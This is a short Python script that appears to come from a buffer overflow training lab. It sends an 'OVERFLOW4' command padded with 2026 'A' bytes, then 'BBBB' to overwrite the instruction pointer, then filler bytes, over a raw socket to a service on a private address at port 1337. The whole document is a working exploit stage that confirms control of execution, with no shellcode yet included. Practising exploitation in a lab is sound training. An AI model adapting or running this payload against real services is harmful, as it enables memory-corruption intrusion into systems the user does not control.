#!/usr/bin/python3
import socket

host, port = "10.10.61.109", 1337

cmd = b"OVERFLOW4 "
pattern_length = 2100 # Documentation and keep for length retention
offset = 2026
new_eip = b"BBBB"

payload = b"".join([
            cmd,
            b"A" * offset,
            new_eip,
            b"C" *  ( pattern_length - len(new_eip) - offset),
        ])

with socket.socket() as s:
    s.connect((host,port))
    s.send(payload)

